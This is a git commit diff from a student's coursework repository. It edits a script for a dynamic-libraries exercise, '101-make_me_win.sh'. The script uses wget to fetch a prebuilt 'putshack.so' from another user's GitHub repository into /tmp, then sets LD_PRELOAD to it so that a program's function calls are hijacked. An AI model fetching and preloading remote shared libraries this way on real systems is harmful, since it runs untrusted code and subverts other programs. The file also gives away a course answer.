280f2904931ae526d0c8c298fae77cc024fa0921
BABABUSOLA <queenbusola1@gmail.com>
2023-06-19 14:44:27 -0700

    101-make_me_win.sh

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp https://github.com/BABABUSOLA/alx-low_level_programming/blob/master/0x18-dynamic_libraries/putshack.so
+wget -P /tmp https://github.com/Tolulope05/alx-low_level_programming/raw/master/0x18-dynamic_libraries/putshack.so
 export LD_PRELOAD=/tmp/putshack.so
